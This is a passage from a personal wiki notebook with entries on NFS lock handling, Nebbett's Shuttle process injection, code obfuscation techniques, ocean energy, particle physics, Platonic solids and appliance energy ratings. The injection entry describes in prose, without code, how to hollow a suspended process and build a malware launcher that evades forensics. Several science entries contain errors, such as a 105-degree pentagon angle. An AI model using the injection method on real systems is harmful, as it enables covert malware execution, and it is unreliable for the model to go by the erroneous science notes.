3   0.000126 172.26.114.2 -&gt; 172.26.114.82 NLM V4 LOCK Reply (Call In 2)
4   0.000133 10.209.105.79 -&gt; 10.209.106.18 NLM V4 LOCK Reply (Call In 1)
5   0.000276 10.209.106.18 -&gt; 10.209.105.79 TCP 798 &gt; npp [ACK] Seq=284 Ack=24 Win=183 Len=0
6   0.000281 172.26.114.82 -&gt; 172.26.114.2 TCP 798 &gt; npp [ACK] Seq=284 Ack=24 Win=183 Len=0
7   0.000325 10.209.106.18 -&gt; 10.209.105.79 NLM [RPC retransmission of #1]V4 LOCK Call (Reply In 4) FH:0xf6a8e266 svid:32755 pos:0-0
8   0.000329 172.26.114.82 -&gt; 172.26.114.2 NLM [RPC retransmission of #2]V4 LOCK Call (Reply In 3) FH:0xf6a8e266 svid:32755 pos:0-0
9   0.000413 172.26.114.2 -&gt; 172.26.114.82 NLM [RPC duplicate of #3]V4 LOCK Reply (Call In 2)
10   0.000417 10.209.105.79 -&gt; 10.209.106.18 NLM [RPC duplicate of #4]V4 LOCK Reply (Call In 1)
11   0.000574 10.209.106.18 -&gt; 10.209.105.79 NLM [RPC retransmission of #1]V4 LOCK Call (Reply In 4) FH:0xf6a8e266 svid:32755 pos:0-0
12   0.000578 172.26.114.82 -&gt; 172.26.114.2 NLM [RPC retransmission of #2]V4 LOCK Call (Reply In 3) FH:0xf6a8e266 svid:32755 pos:0-0
13   0.000667 172.26.114.2 -&gt; 172.26.114.82 NLM [RPC duplicate of #3]V4 LOCK Reply (Call In 2)
14   0.000670 10.209.105.79 -&gt; 10.209.106.18 NLM [RPC duplicate of #4]V4 LOCK Reply (Call In 1)
15   0.040660 10.209.106.18 -&gt; 10.209.105.79 TCP 798 &gt; npp [ACK] Seq=852 Ack=72 Win=183 Len=0
16   0.040669 172.26.114.82 -&gt; 172.26.114.2 TCP 798 &gt; npp [ACK] Seq=852 Ack=72 Win=183 Len=0
}}}

This problem would not happen if the share were exported to '*' as the client nasgw12_02 would also come under this list and lock requests would be accepted by nasgw12_01. Ethereal will not tell directly that the reply contains rejected reply, only looking at the full packet trace using wireshark would tell that the reply contains AUTH_ERROR with bad credential (seal broken). With linux client it would try a couple of times, other clients may not. On the client from the tool which is being used to acquire the lock, you should permission denied error.

!!Internal NFS shares
To avoid the problem described we create internal nfs shares for all the filesystem exported using NFS to all hosts in the cluster. We do this by exporting all those filesystems to the private ip subnet that is present on priveth0. These internal shares are created when a filesystem is shared first and deleted when the last share for that filesystem is deleted. Internal shares are created with name ishare and behave the same way as other shares, they are restricted from being visible from clish.

{{{
Share ishare_100 (
                PathName = &quot;/vx/fs_mirr&quot;
                Client = &quot;172.26.114.81/24&quot;
                Options = &quot;rw,no_root_squash&quot;
                )
}}}

The internal shares are always exported with the options rw,no_root_squash. This does not creates problems even if the actual shares are exported as read-only, even if we have added permissions for NLM clients to take rw locks, the lock request would pass the RPC layer but get denied at the NLM layer which will use the HOST name filed in the NLM payload. Based on similar testing no problems were observed with no_root_squash even if the original shares were exported as root_squash. </pre>
</div>
<div title="Nebbetts Shuttle" modifier="BhargavaKancherla" modified="200801151433" created="200801140831" changecount="1">
<pre>!Nebbett's Shuttle

This technique was windows specific and utilises the win32 api as well as internal windows functions to accomplish its purpose. The essence of Nebbett's approach was to launch a process in suspended state. Once in suspeneded state its process memory could be manipulated and overwritten with a new executable. Execuiton of this process is then resumed. 

Covertly laucning an executable using Nebbett's Shuttle allows the malicious process to appear as process which it was started as. For example, if one were to use this technique with notepad.exe bein g the process which is started in a suspended state, then overwritten with sol.exe, a game of solitaire would be presented to the user. When the user views their task manager it will appear as though the notepad program is running. 

A malware launcher can be crafter which downloads a program from the internet and executes it without leaving any disk residue of this action taking place. With no disk residue a forensic examiner will also be unable to capture the malicious binary for reverse engineering. 

A program which uses debugger techniques will launch or attach to a process. If the process is launched by the debugger then a breakpoint will be placed at any entry point. Otherwise, if the debugger attaches to a running process then a breakpoint is placed at the currently executing instruction. When the breakpoint is triggered, control flow of the program belongs to the debugger. The first step taken against the suspended process is to inject a small piece of shellcode at the currently executing memory location whose purpose it is to allocate a small buffer outside of the locaiton occupied by the executables memory image. The final instruction in this shellcode will be a software interrupt (int 3). When the interrupt instruction is executed control will return to the debugger. 

The next action performed by the debugger is the injection of a second piece of shellcode. This time the shellcode is inserted into the memory buffer which was just created by the first piece of shellocde. The job of second piece of shellcode is first to unmap the executable image from memory. The reason for this is so that we can place our new executable in its favored location and eliminate some compatibility issues associated with this form of injection. Next the shellcode allocates the amount of memory needed to contain the new executable memory image. It then grows the heap if needed, according to what is required by the new executable. Once again, the final instruction in the shellcode is the sofware interrupt instruction.

After control returns to the debugger it must populate the target process' memory with the new executable image. It will also populate the stack with the appropriate data for the new process and set registers to the values appropriate for a new process. At this point the debugging process may detach itself from the target if necessary as execution is resumed on manipulated process.

A protable mechanism exists for performing debugging operations on most UNIX variants. This interface, the ptrace() system call, provides capablities to attach to a remote process, debug a child process, read and write process memory, manipulate registers and alter signal handlers in the target process. Using the approach of the ptrace() system call to manipulate processes it is possible to achieve other process injection techniques beyond what we have just discussed.
</pre>
</div>
<div title="Obfuscation Techniques" modifier="BhargavaKancherla" modified="200807071112" created="200801140834" changecount="4">
<pre>!Obfuscation Techniques

''Less Human Readable code''
#Remove Debug information
#Alter the control flow
#Encrypt constants
#Restructure simple logic
#Inject unnecessary code

''Data Obfuscation''
#Split varaibles
#Promote scalars to objects
#Inheritance relations
#change encoding
#split,fold, merge arrays
#reorder instance variables

''Layout Obfuscation''
#scrabmble identifiers
#change formatting
#remove comments, line numbers
#remove debug information

''Control obfuscation''
#clone methods
#reorder statements and loops
#reducible to non-reducible flow graphs
#extend loop conditions
#outline statements

''Preventive obfuscation''
#exploit weaknesses in current decompilers and deobfuscators
#explore inherenet problems with deobfuscation techniques
</pre>
</div>
<div title="Ocean Energy" modifier="YourName" created="200811211752" changecount="1">
<pre>Ocean thermal energy conversion (OTEC) is a method for generating electricity which uses the temperature difference that exists between deep and shallow waters to run a heat engine. As with any heat engine, the greatest efficiency and power is produced with the largest temperature difference.

The temperature difference generally increases with decreasing latitude, i.e. near the equator, in the tropics. However, evaporation prevents the surface temperature from exceeding 27 deg.C (80 deg.F). Also the subsurface water rarely falls below 5 deg.C

The total energy available is one or two orders of magnitude higher than other ocean energy options such as wave power, but the small magnitude of the temperature difference makes energy extraction comparatively difficult and expensive, due to low thermal efficiency. Earlier OTEC systems had an overall efficiency of only 1 to 3% (the theoretical maximum efficiency lies between 6 and 7%.

A heat engine is a thermodynamic device placed between a high temperature reservoir and a low temperature reservoir. As heat flows from one to the other, the engine converts some of the heat energy to work energy. This principle is used in steam turbines and internal combustion engines, while refrigerators reverse the direction of flow of both the heat and work energy. Rather than using heat energy from the burning of fuel, OTEC power draws on temperature differences caused by the sun's warming of the ocean surface.

OTEC could produce gigawatts of electrical power. Managing costs is still a huge challenge, however. All OTEC plants require an expensive, large diameter intake pipe, which is submerged a kilometre or more into the ocean's depths, to bring very cold water to the surface.

To operate, the cold seawater must be brought to the surface. This can be accomplished through direct pumping. A second method is to desalinate the seawater near the sea floor; this lowers its density, which will cause it to &quot;float&quot; up through a pipe to the surface.

Depending on the location
* Land based plant
* Shelf based plant
* Floating plant

Depending on the cycle used
* Open cycle
* Closed cycle
* Hybrid cycle

!!!Closed-cycle
Closed-cycle systems use fluid with a low boiling point, such as ammonia, to rotate a turbine to generate electricity. Warm surface seawater is pumped through a heat exchanger where the low-boiling-point fluid is vaporized. The expanding vapor turns the turbo-generator. Then, cold, deep seawaterpumped through a second heat exchangercondenses the vapor back into a liquid, which is then recycled through the system.

[img[images/closed.cycle.ocean.gif]]

!!!Open-cycle
Open-cycle OTEC uses the tropical oceans' warm surface water to make electricity. When warm seawater is placed in a low-pressure container, it boils. The expanding steam drives a low-pressure turbine attached to an electrical generator. The steam, which has left its salt and contaminants behind in the low-pressure container, is pure fresh water. It is condensed back into a liquid by exposure to cold temperatures from deep-ocean water. This method has the advantage of producing desalinized fresh water, suitable for drinking water or irrigation.

!!!Hybrid
A hybrid cycle combines the features of both the closed-cycle and open-cycle systems. In a hybrid OTEC system, warm seawater enters a vacuum chamber where it is flash-evaporated into steam, similar to the open-cycle evaporation process. The steam vaporizes the ammonia working fluid of a closed-cycle loop on the other side of an ammonia vaporizer. The vaporized fluid then drives a turbine to produce electricity. The steam condenses within the heat exchanger and provides desalinated water. 
</pre>
</div>
<div title="Particle Physics" modifier="BhargavaKancherla" modified="200807161620" created="200807151022" changecount="4">
<pre>!Classical idea of physics
Clasical ideas define gravity and other things. These laws hold in the world with objects of bigger size. With tiny objects such as electrons the classical laws of physics fail.

* ''Mass is Conserved'': E = mc^^2^^.  So mass can be created or destroyed if equivalent energy is created or destroyed. 
* ''Gravity'': Newton simply thought that gravity was another force and that two masses have some mysterious force pulling them together. Einstein thought otherwise; he believed that mass curves the space arround it and because of this curvature in space, objects are &quot;attracted&quot; to each other.

!Initial theory of Particle Physics
All objects are made of fundamental constiuents electrons, protons and neutrons. All atoms area of the same size, but nucleus are of different size. Atoms cannot be seen by eye, because the the size of atoms is less than wavelength of light.
Also called ''high energy physics''

!Leptons
Leptons are a class of partciles which are very light such as electrons, neutrions, muions. Muion is a heavier version of electron.

!Force carrying particles
Same charges repel each other. An electron repels an electron. An electron creates a force carrying patricle and sends it to the other electron, which recoils and moves away due to the force of the transferred particle. The 2nd electron alos does the same thing repelling the first electron. These force particles are \Bphotons\B

!Dalton's theory
Dalton measured various chemical reactions, and observed the weight is always conserved. That is the same number of say carbon atoms and nitrogen atoms comes out of chemical reactions which weigh some number of units. 

!Dimitriv Mendelev's periodic table
Dimitriv based on dalton's theory starting calculating various kind of atoms present in the world. His theory stated that chemical reactions are just exchange of atoms from one compound into another compound. 
Dimitriv created the periodic based upon his measurements of weights of atoms. He organised these atoms based upon the properties of the atoms. 

!Brownian Motion
A dust particle of pollen when put in a fluid, the little particle would jiggle around moved in either direction randomly. Einstien's theory is the little particle is being hit by atoms from both sides, when the force one side is greater than other side the particle moves that side. 

!Radioactivity
Energy coming out of elements without any reaction. Common Radiation is 
# ''Alpha radiation'' +vely charged, proton beam
# ''Beta radiation'' (cathode rays) -vely charged, electron beam
# ''Gamma radiation'' (X-rays), bones absord X-rays, neutron beam

!Plank's theory
Plank analysed how elements emit light when heated. When you jiggle a charge a little elecromagnetic wave which travel away which is called light a wave. Light was understood to be wave. According to plank light is emitted in quantums of light, which is in agreement with the data. 

!Einstein's papers
Einstein after completing his Phd worked in a patent office, durin which time he published 3 papers.
# ''Brownian Motion'', qunatitive demonstration of atoms are real
# ''Special Theory of relativity''
# ''Photo-electric effect'', when light hits metal electricity is produced.  

!Neil Bohr's theory
Electron orbit is made up of qunatums. Electron is ''wave-particle duality''. Electron is both wave and particle at the same time. 

!Schrodinger's equation
Its a equation which can be solved to find electron properties like energy.

!Max born
Electron is travelling in a wave, but the equation explains where the electron is likely to be found and where it is not likely to be not found. 

!Heisenberg' uncertainity principle
Its a forumula which says if you have information about one thing then you lose information about another thing.

!Paul DeRac Qunatum Electro-dynamics QED
DeRac QED is consistent with quantum mechanics and theory of relativity. Electron is a point like object. Even thoudh its a point it has a mass, charge and spin.

!Anti-Matter
Same mass and spin but different charge. Electron anit-matter is positron. When matter and anti-matter meet they annilate each other. 

!Yukawa's theory
Yukawa described the strong nuclear force inside the nucleus. Similar to electron which produces a photon and sends it to the other electron which causes both of them to repel each other, protons also produce some particles. Strong nuclear forces is atleast 1000 times stronger than electric force. Strong nuclear force is made up of particle which is massive. The way this particle is created by following heisenberg uncertainity principle which allows to use energy around for a very small amount of time and create a particle and use it as force carrier. The principle also explains how much amount of energy can be borrowed and for how long. These particles are called mesons. This force increase with lesser distance as the time to travel for the meson is smaller it can be more heavier. These type os mesons are callee pions, there also other types of mesons (vritual particles). 

!Natural Radiation
From the sky called cosmic radiation from stars and sun. Mostly of high energy protons. 

!Ion trails
When radiation like alpha or beta rays which are charged when hits matter repels the electric charge in atom. As the rays pass through the matter it leaves an ion trail, which have either more postive or negavtive charge. 

!Particle Accelarators
Particle accelarators are apparatus which can detect the charge particle beam. When a photographic plate is exposed to charged particle beam it will leave a ion trail in the plate. The intensity of the trail can be used to find out properties about the particle beam. Highly charged particly would leave thicker beam. 
# ''Cloud chamber'' - a chamber closed with piston and containing gas. When the piston is released the gas expands and expanded gas likes to condense. When this condensed gas is exposed to ion trail it would leave a trail of water droplets. Even though the ion trail is microscopic the water droplet trail is visible. The cloud chamber is 3d when compared to photographic plate which is 2d. 
# ''Bubble chamber'' - similar principle to cloud chamber but uses superheated water

The density of water droplets describes the properties of charged particle bream. This when combined with magnetic field, which can be used to deflect the charged beam helps to find more properties. Stronger beam would bend less. 

!Faraday
Faraday proposed that space between the nucleus and the electron is not empty, but is filled with electro-magnetic field. This field is a source of energy and can be used to borrow energy to create particle an anti-particle. Therefore an atom is composed of electron, proton and a electric field which can produce different number of particle and anti-particle pairs. These virtual particles are called vaccum fluctuations. 

[[feinman's diagrams]]

!Gellman's model
Proton is made of quarks. There were 3 types of quarks in this model called up,down and strange. A particle can be made up of different combination of these quarks. According to this model a meson is quark and anti-quark. Yukawa's pion is an up-quark and anti-down-quark. Corks are described as point like particle like electrons.
In this model a proton is up,up and down quark combination. Each of these quark has a particular spin. up has 1/2 spin, down has -1/2 spin, so a proton has a 1/2 spin. up and down quark weight about 1/3 unit. A neutron is made up of one up quark and 2 down quarks. An up quark has charge +2/3 and down has -1/3. 
Gellman proposed a strangeness number. A berion is up,down and strange, has a strangeness 1. Strange particle is a little heavier than up/down quark. A strange,strange,strange particle is called omega. A strange particle has the same charge as down quark. 

!Delta particle
A delta particle is a little heavier than proton, and very quickly decays into a proton. A delta particle is made up of up,up,up quarks. 

!Colour property
An up quark with the same spin cannot be kept with an up quark of the same spin. So if a particle with 3 up quarks exist, then they need to have some property which has different values. This colour property is the charge of the quark which helps the quarks to stick together called colour charge. The colour force is the force that arises when two colour charges gets close together.
So a object with quarks of 3 differnet colours is colour neutrual. Protons and neutrons are colour neutral. Even though the protons and neutrons are colour neutral the colour is distributed in the proton. When the protons are far apart the effect of distributedness is low and hence they do not experience cloour force. When the protons comes close the distributedness of the colour charge comes into effect and both protons attrct towards each other. 
A meson is made up of quark of one colour and anit-quark with anti-colour. 

!Quantum chrom-dynamics - QCD
Quantum field of colours. When a colour field around a coloured object is jiggled it creates glueons and anti-glueons. Unlike photons, mesons which are electrically neutral, glueons are not colour neutral. Glueons have colour charge and hence the field around a glueon is charged. Glueons travelling from the one colour charge to another can interact with other glueons, hence the colour force is a lot more stronger than electric force. The force gets stronger by time. When we try to pull two colour charges away the glueon force gets strouger and grows with distance. If we try pullout a quark the colour force gets stronger and stronger and it is impossible to pull out a quark out of a proton, that is why we donot find an individual quark. We can only find a colour neutral particle, a particle with 3 quarks and colour neutral such as neutrons and protons, a particle with 2 quarks with colour and anti-colour. We cannot find a non-colour neutral particle in lab.

!Weak force Particles
Weak force carriers are called w+ and w- particles and 'z' particles. The w particle is incredibly massive, hence can only be borrowed for a extraordinary short time. The mass of a w boson is around 80 times that of a proton. 

!Neutrino
Neutrino has no electric charge, no mass. It can only be emitted or absorbed by w bosons, i.e a neutrino can only interact with weak force. They have spin 1/2. A neutrino produced by beta decay is an electron-flavoured neutrino. When this neutrino interacts with the nucleus then it is likely to produce electron, it will never produce a muion. When a muion decays to produce electron, it also produces muion-flavoured neutrino and an electron-flavoured neutrino. Every nulcear reaction in the sun produces a neutrino.  

!Beta decay
A neutron converting into a proton and electron. Beta decay produces another particle neutrino.

!Strangeness
Strangeness is preserved during strong force interactions but not during weak force interactions. 

!Particles
* Strongly interacting particles (hedrons)
# protons, neutrons, pions
# berions
** particle like particles protons, neutrons
** spin 1/2 or 3/2 or 5/2 but never integers
# mesons
** pions, kions that can decay into mesons 
** spin 0,1,2 always integers

Weakly interacting particles (leptons)
# electron
# neutrino
# muion

fermions are particles with spin 1/2
bosons are partciles with spin 0,1,2

photons are bosons. Photons have spin 1. bosons are mostly force carriers. 
glueons are bosons with spin 1. 
z particles are bosons with spin 1.

Four kions. +ve, -ve , +ve strange , -ive strange. 

!jpsi particle
is a meson lives for a very long time. Made up of Charm quark and anti-quark

!Charm quark 
Heavier version of up quark, similar to heavier version of down quark which is the strange quark. 

!Tou lepton

!Fundamental Particles

Corks 	up 	down	strange		charm 	top 	bottom
Leptons electron electron-flavoured neutrino muion muion-flavoured neutrino tou tou-flavoured neutrion

!epsillion

!Electro-weak force theory
At higher energies weak forces get stronger. Weak force is similar to electro-magnetic forces. The mass of the z and w particle from this theory. 

!Higg's particle
The higg's field is everywhere. Every fundamental particle interacts with it. 

!Gauge symmetry

!CP-violation
Breaking of symmetry between matter and anti-matter. Weak interaction violates symmetry. Decay is not symmetry. A particle could decay into fundamental particles which conserve quantum numbers. It has been observed during decay the same number of particle and anti-particles are not observed. Matter is more common in nature than anti-matter. If the nature is made up of same amount of matter and anti-matter they would annihilate each other, and the world would be empty.

!Super Symmetry
Super partner of a particle have the same values for all qunatum numbers except spin. The spin of super partner is different. 

!String theory
The world is made up of lines(strings). String is the only fundamental particle in the world. 
</pre>
</div>
<div title="Platonic Solids" modifier="BhargavaKancherla" modified="200807160557" created="200807151021" changecount="6">
<pre>!Platonic Solids
There are only 5 3-d symmetric figures

# ''Cube''
# ''Tetrahedron'' - a 3d figure. with four sides as triangles. Similar to pyramid except the base is also a triangle 
# ''Octahedron'' - 8 triangle faces. Joining two pyramids gives a octahedron.
# ''Do-decahedron'' - 12 pentagon sides. 
# ''Icosohedron'' - 20 triangular faces. 

|Tetrahedron|
|[img[images/Tetrahedron.gif]]|
|Cube or Hexahedron|
|[img[images/Cube.gif]]|
|Octahedron|
|[img[images/Octahedron.gif]]|
|Do-decahedron|
|[img[images/Dodecahedron.gif]]|
|Icosohedron|
|[img[images/Icosahedron.gif]]|









It is not possible to have anymore other than these. 

In a triangle each angle is 60 degrees, so at a vertex we can have 3x60 4x60 5x60 angle being formed which result in tetrahedron, octahedron icosohedron respectively.

In a rectangle each angle is 90 degress, so at a vertex we can have 3x90 which result in cube.
In a pentagon each angle is 105 degrees, so at a vertex we can have 3x105 which result in do-decahedron. 
In a hexagon each angle is 120 degrees, so at a vertex having 3x120 results in a flat plane. 
Hence we cannot have any more symmetric solids other than these. 

!Edges and Vertices
|Solid|		Vertex|	Faces|	Edges|
|Cube|		8|	6|	12|
|Tetrahedron|	4|	4|	6|
|Octahedron|	6|	8|	8|
|Do-decahedron|	20|	12|	30|
|Icosohedron|	12|	20|	30|


!Duality
An Octahedron can be created by joining the midpoints the sides of a cube. This property is called duality. Octahedron is dual of cube. Icosohedron is dual of do-decahedron. A Tetrahedron is self-dual

</pre>
</div>
<div title="Power Consumption of devices" modifier="YourName" modified="200807041039" created="200807040936" changecount="13">
<pre>!BEE Labeled Air Conditioners as of 19th April 2007

Brand:	Carrier
Type  : Window Air Conditioner

|Sl.No.|Model No. | TON |Cooling Capacity (W)| Power Consumption (W)| Energy Efficiency Ratio (EER)| (W/W) Star rating|
|1|WCARS09FA|0.75|2423|996|2.43|1|
|2|WCARS09FE|0.75|2423|996|2.43|1|
|3|WCARS12FA|1|3412|1381|2.47|1|
|3|WCARS12FE|1|3412|1381|2.47|1|
|5|GWRAC018X1001|1.5|4876|1889|2.58|2|
|6|GWRAC018X1e001|1.5|4876|1889|2.58|2|
|7|GWRAC018X2001|1.5|4876|1889|2.58|2|
|8|GWRAC018X2e001|1.5|4876|1889|2.58|2|
|9|GWRAC018DM001|1.5|4876|1889|2.58|2|
|10|GWRAC018DMe001|1.5|4876|1889|2.58|2|
|11|GWRAC018DR001|1.5|4876|1889|2.58|2|
|12|GWRAC018DRe001|1.5|4876|1889|2.58|2|
|13|GWRAC018ER001|1.5|5214|1861|2.80|3|
|14|GWRAC018ERe001|1.5|5214|1861|2.80|3|
|15|GWRAC024X1002|2|6078|2545|2.39|1|
|16|GWRAC024X1e002|2|6078|2545|2.39|1|
|17|GWRAC024X2002|2|6078|2545|2.39|1|
|18|GWRAC024X2e002|2|6078|2545|2.39|1|
|19|GWRAC024DM001|2|6078|2545|2.39|1|
|20|GWRAC024DMe001|2|6078|2545|2.39|1|
|21|GWRAC024DR001|2|6078|2545|2.39|1|
|22|GWRAC024DRe001|2|6078|2545|2.39|1|

Brand:	Carrier
Type  : 	Split Air Conditioner

|Sl.No.|Model No. | TON |Cooling Capacity (W)| Power Consumption (W)| Energy Efficiency Ratio (EER)| (W/W) Star rating|
|1|Durakool 012|1.0|3175|1240|2.56|1|
|2|Estrella 012|1.0|3693|1128|3.27|5|
|3|Durakool 018|1.5|4725|1860|2.54|1|
|4|Durakool-e 018|1.5|4725|1860|2.54|1|
|5|Estrella 018|1.5|5375|1696|3.17|4|
|6|Durakool 024|2.0|6320|2580|2.45|1|
|7|Durakool-e 024|2.0|6320|2580|2.45|1|

Brand:	Voltas
Type  : 	Window Air Conditioner

|Sl.No.|Model No. | TON |Cooling Capacity (W)| Power Consumption (W)| Energy Efficiency Ratio (EER)| (W/W) Star rating|
|1|4010854|0.75|2630|980|2.68|2|
|2|4010849|1|3510|1310|2.68|2|
|3|4010852|1.5|5270|1980|2.66|2|
|4|4010853|2|7030|2650|2.65|2|

Brand:	Voltas
Type  : 	Split Air Conditioner

|Sl.No.|Model No. | TON |Cooling Capacity (W)| Power Consumption (W)| Energy Efficiency Ratio (EER)| (W/W) Star rating|
|1|4501006|0.75|2630|965|2.73|3|
|2|4500997|0.75|2630|980|2.68|2|
|3|4501009|1|3510|1310|2.68|2|
|4|4500994|1|3510|1310|2.68|2|
|5|4501004|1|3510|1140|3.10|5|
|6|4501008|1.5|5270|1980|2.66|2|
|7|4500999|1.5|5270|1980|2.66|2|
|8|4501001|2|7030|2610|2.69|2|
|9|4501005|1.5|5270|1720|3.00|4|
|10|4501007|2.0|6450|2110|3.00|4|

Brand :	DAIKIN
Type   :  Spilt Air Conditioners

|Sl.No.|Model No. | TON |Cooling Capacity (W)| Power Consumption (W)| Energy Efficiency Ratio (EER)| (W/W) Star rating|
|1|FT50BVM/R50BV1|1.5|5100|1750.00|2.91|4|

Brand	LG	
Type : Window Air Conditioners

|Sl.No.|Model No. | TON |Cooling Capacity (W)| Power Consumption (W)| Energy Efficiency Ratio (EER)| (W/W) Star rating|
|1|LWA3CW1AM1|1.0|3222|1340|2.40|1|
|2|LWA3CW1AB1|1.0|3222|1340|2.40|1|
|3|LWA5CW1AM1|1.5|5125|2075|2.47|1|
|4|LWA5CW1AB1|1.5|5125|2075|2.47|1|
|5|LWA5CW1AS1|1.5|5125|2075|2.47|1|

Brand	LG	
Type : Spilt Air Conditioners

|Sl.No.|Model No. | TON |Cooling Capacity (W)| Power Consumption (W)| Energy Efficiency Ratio (EER)| (W/W) Star rating|
|1|LSA3TW2AB1|1.0|3516|1335|2.63|2|
|2|LSA3TW2AS1|1.0|3516|1335|2.63|2|
|3|LSA3UW2AF1|1.0|3516|1335|2.63|2|
|4|LSA3UW2VF1|1.0|3516|1335|2.63|2|
|5|LSA3WB2VF1|1.0|3516|1310|2.68|2|
|6|LSA3WG2VF1|1.0|3516|1310|2.68|2|
|7|LSA3WB2PF1|1.0|3516|1310|2.68|2|
|8|LSA3WG2PF1|1.0|3516|1310|2.68|2|
|9|LSA3YS3VTY1|1.0|3575|1240|2.88|3|
|10|LSA3YG3VTY1|1.0|3575|1240|2.88|3|
|11|LSA3YE3VTY1|1.0|3575|1240|2.88|3|
|12|LSA3YB3VTY1|1.0|3575|1240|2.88|3|
|13|LSA5ZG4NTY1|1.5|5275|1785|2.96|4|

!BEE Labeled Direct Cool Refrigerators as of 15th May 2007

Brand		:	Whirlpool 

|Sl.No.|Refrigerator Model No.|Gross Volume, Liters| Storage Volume, Liters| Electricity Consumption, Units per year |Star rating|
|1|DC18|175|163|372|3|
|2|DC19|180|168|312|4|
|3|DC21|200|195|324|4|
|4|DC24|230|218|330|4|
|5|FC21|200|195|324|4|
|6|FC24|230|218|330|4|

Brand	:	LG

|Sl.No.|Refrigerator Model No.|Gross Volume, Liters| Storage Volume, Liters| Electricity Consumption, Units per year |Star rating|
|1|GL-181 CM|175|160|299|4|
|2|GL-201 CM|200|183|305|4|


!BEE Labeled Frost Free Refrigerators as of 30th March 2007

Brand		:	LG

|Sl.No.|Refrigerator Model No.| Gross Volume, Liters | Storage Volume, Liters| Electricity Consumption, Units per year| Star rating|
|1|GL-366DMQ|350|315|508|4|
|2|GL-406DMQ|390|353|527|4|
|3|GL-244GP|230|203|540|3|
|4|GL-268LM|250|222|560|3|
|5|GL-265TT|250|222|555|3|
|6|GL-244GM|230|203|540|3|
|7|GL-245TM|230|203|545|3|
|8|GL-245TT|230|203|545|3|
|9|GL-265TM|250|222|555|3|
|10|GR448JTX|422|388|690|3|
|11|GR486ZMQ|463|428|688|3|
|12|GR518JTX|491|458|632|3|
|13|GR488JTX|463|428|688|3|
|14|GR516ZMQ|491|458|632|3|
|15|GR446ZMQ|422|388|690|3|
|16|GL-245LMF|230|203|380|5|
|17|GL-248LM|230|203|550|3|
|18|GL-244GP4|230|203|450|4|
|19|GL-244GM4|230|203|450|4|
|20|GL-245TMG4|230|203|455|4|
|21|GL-245TTG4|230|203|455|4|
|22|GL-248LMG4|230|203|460|4|
|23|GL-265TMG4|250|222|465|4|
|24|GL-265TTG4|250|222|465|4|
|25|GL-268LMG4|250|222|465|4|
|26|GL-265LMF|250|222|385|5|


Brand	:	Samsung

|Sl.No.|Refrigerator Model No.| Gross Volume, Liters | Storage Volume, Liters| Electricity Consumption, Units per year| Star rating|
|1|RS20NCMS6|545|480|616|4|
|2|RT45MASM1|400|362|575|4|
|3|RS20CCSH6|545|480|616|4|
|4|RS25KAMS2|750|670|1077|2|
|5|RS21DCSW2|595|524|834|3|
|6|RS21DCMS2|595|524|834|3|
|7|RL39WBMS1|380|345|670|3|
|8|RT26HVTT1/XTL|260|238|470|4|
|9|RT25GVPS1/XTL|250|226|465|4|
|10|RT34HVWS1/XTL|345|319|495|4|
|11|RT31GVSS1/XTL|315|289|485|4|
|12|RT28GVSS1/XTL|280|258|475|4|
|13|RT25GVSS1/XTL|250|226|465|4|
|14|RT31HVMS1/XTL|315|289|485|4|
|15|RT34GVSS1/XTL|345|319|495|4|
|16|RT28GVPS1/XTL|280|258|475|4|
|17|RT31GVPS1/XTL|315|289|485|4|
|18|RT31IVWS1/XTL|315|289|485|4|
|19|RT34HVMS1/XTL|345|319|495|4|
|20|RT26IVWS1/XTL|260|238|470|4|
|21|RT26HVMS1/XTL|260|238|470|4|
|22|RT41MASW|375|337|565|4|
|23|RT41MASM1|375|337|565|4|
|24|RT45MASW|400|362|575|4|
|25|SG629EESMH|560|474|799|3|
|26|RT62WASM1|530|492|642|4|
|27|RT58EASM1|510|476|635|4|
|28|RT53EASM1|455|398|593|4|
|29|RT49MASM1|430|388|590|4|
|30|RS23JFNS2|630|559|863|3|
|31|RS21KLWR2|595|519|926|2|
|32|RS21JLBG2|595|519|926|2|
|33|RT23LVWS1-XTL|230|208|460|4|
|34|RT23HVMS1-XTL|230|208|460|4|
|35|RT23HVTT1-XTL|230|208|460|4|
|36|RT23LVDR1-XTL|230|208|460|4|
|37|RT23LVMB1-XTL|230|208|460|4|

Brand		:	Whirlpool

|Sl.No.|Refrigerator Model No.| Gross Volume, Liters | Storage Volume, Liters| Electricity Consumption, Units per year| Star rating|
|1|FF23|220|195|442|4|
|2|FF26|250|225|460|4|
|3|FF30|280|250|476|4|
|4|FF32|310|275|489|4|
|5|FF35|340|305|620|3|


Brand	:	Godrej

|Sl.No.|Refrigerator Model No.| Gross Volume, Liters | Storage Volume, Liters| Electricity Consumption, Units per year| Star rating|
|1|GFE26B|243|208|482|4|
|2|GFE26C|243|208|478|4|
|3|GFE26D|243|208|478|4|
|4|GFE28B|263|228|489|4|
|5|GFE28C|263|228|489|4|
|6|GFE28D|263|228|489|4|
|7|GFE32B|304|245|493|4|
|8|GFE36B|342|264|504|4|
|9|GFE220P|197|162|573|3|
|10|GFE220S|197|162|573|3|

Brand	:	VIDEOCON

|Sl.No.|Refrigerator Model No.| Gross Volume, Liters | Storage Volume, Liters| Electricity Consumption, Units per year| Star rating|
|1|D275DX|250|218|515|3|
|2|D-280|250|218|515|3|
|3|D280DX|250|218|515|3|
|4|D280WDDX|250|218|455|4|


Brand	:	KENSTAR

|Sl.No.|Refrigerator Model No.| Gross Volume, Liters | Storage Volume, Liters| Electricity Consumption, Units per year| Star rating|
|1|KRF255AD|250|218|515|3|
|2|KRF255AD|DX-250|218|455|4|

Brand	:	ELECTROLUX

|Sl.No.|Refrigerator Model No.| Gross Volume, Liters | Storage Volume, Liters| Electricity Consumption, Units per year| Star rating|
|1|ER245FF|235|204|706|2|
|2|ER285FF|275|247|748|2|





!BEE Labeled Tubular Fluorescent Lamps as of 30th March 2007

Brand	:	SURYA
|1.	|40 W, 6500 K Tubular Fluorescent Lamp			  |3 (Three) Star| 
|2.     |36 W,  6500 K SLIMLITE Tubular Fluorescent Lamp	 	  |3 (Three) Star |
|3.	|36 W, 6500 K SUPER BRIGHT Tubular Fluorescent Lamp	  |4 (Four) Star|

Brand	:	GALAXY
|1.	|40 W,  6500 K Tubular Fluorescent Lamp	                |3 (Three) Star|
|2.     |36 W,  6500 K SLIMLITE Tubular Fluorescent Lamp	   |3 (Three Star|
|3.	|36 W, 6500 K SUPER BRIGHT Tubular Fluorescent Lamp |4 (Four) Star|
|
Brand	:	OSRAM
|1.	|36 W, 6500 K Tubular Fluorescent Lamp		|3 (Three) Star|
|2.     |36 W, 4000 K, HL Tubular Fluorescent Lamp		|5 (Five) Star|
